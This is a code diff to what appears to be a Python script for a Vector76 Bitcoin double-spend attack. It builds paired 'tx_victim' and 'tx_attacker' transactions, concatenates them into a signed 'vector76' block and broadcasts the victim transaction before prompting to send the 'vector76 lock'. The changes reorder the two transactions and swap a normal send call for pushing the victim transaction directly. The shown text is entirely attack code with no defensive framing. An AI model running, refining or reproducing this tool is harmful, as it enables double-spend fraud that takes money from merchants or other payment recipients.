@@ -119,7 +119,7 @@ tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
 
-vector76 = f"{tx_victim}{tx_attacker}"
+vector76 = f"{tx_attacker}{tx_victim}"
 vector76_block   = cryptos.serialize(transaction_util.signall(cryptos.deserialize(vector76), fake_send_from))
 
 print()
@@ -142,8 +142,8 @@ print()
 print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print("Sending V1 Transaction ...")
-txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount)
-print(txid)
+transaction_util.pushtx(tx_victim)
+#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount)
 print()
 input("--- Send the vector76 lock after pressing the enter key. --- ")
 print()
